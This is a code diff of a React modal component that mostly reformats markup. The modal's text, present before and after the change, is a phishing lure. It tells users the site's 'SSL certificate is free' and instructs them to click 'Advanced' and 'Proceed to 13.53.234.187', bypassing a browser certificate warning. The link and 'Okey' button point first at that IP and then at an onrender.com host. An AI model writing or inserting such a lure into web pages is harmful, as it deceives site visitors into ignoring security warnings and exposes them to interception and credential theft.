@@ -5,12 +5,9 @@ export default function Modal() {
   const [showModal, setShowModal] = React.useState(true);
   return (
     <>
-      
       {showModal ? (
         <>
-          <div
-            className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none"
-          >
+          <div className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none">
             <div className="relative w-auto my-6 mx-auto max-w-3xl">
               {/*content*/}
               <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
@@ -31,12 +28,19 @@ export default function Modal() {
                 {/*body*/}
                 <div className="relative p-6 flex-auto">
                   <p className="my-4 text-slate-500 text-lg leading-relaxed">
-                  "Attention all users: Our website's SSL certificate is free. So to access all of our services and ensure the best
-                   possible experience, please visit our website at 
-                   <a href='https://13.53.234.187/ssl' className="text-red-300 underline"> Here </a>.
-                   and click "Advanced " and Click Proceed to 13.53.234.187 ,
-                    We appreciate 
-                  your cooperation and support as we work to provide you with the best possible user experience."
+                    "Attention all users: Our website's SSL certificate is free.
+                    So to access all of our services and ensure the best
+                    possible experience, please visit our website at
+                    <a
+                      href="https://share-me-n2qk.onrender.com/"
+                      className="text-red-300 underline"
+                    >
+                      {" "}
+                      Here{" "}
+                    </a>
+                    . and click "Advanced " and Click Proceed to 13.53.234.187 ,
+                    We appreciate your cooperation and support as we work to
+                    provide you with the best possible user experience."
                   </p>
                 </div>
                 {/*footer*/}
@@ -53,7 +57,7 @@ export default function Modal() {
                     type="button"
                     onClick={() => setShowModal(false)}
                   >
-                     <a href='https://13.53.234.187/ssl'> Okey </a>
+                    <a href="https://share-me-n2qk.onrender.com/"> Okey </a>
                   </button>
                 </div>
               </div>
@@ -65,4 +69,4 @@ export default function Modal() {
     </>
   );
 }
-ReactDom.createPortal(<h1>Hello</h1> , document.getElementById('model'))
+ReactDom.createPortal(<h1>Hello</h1>, document.getElementById("model"));
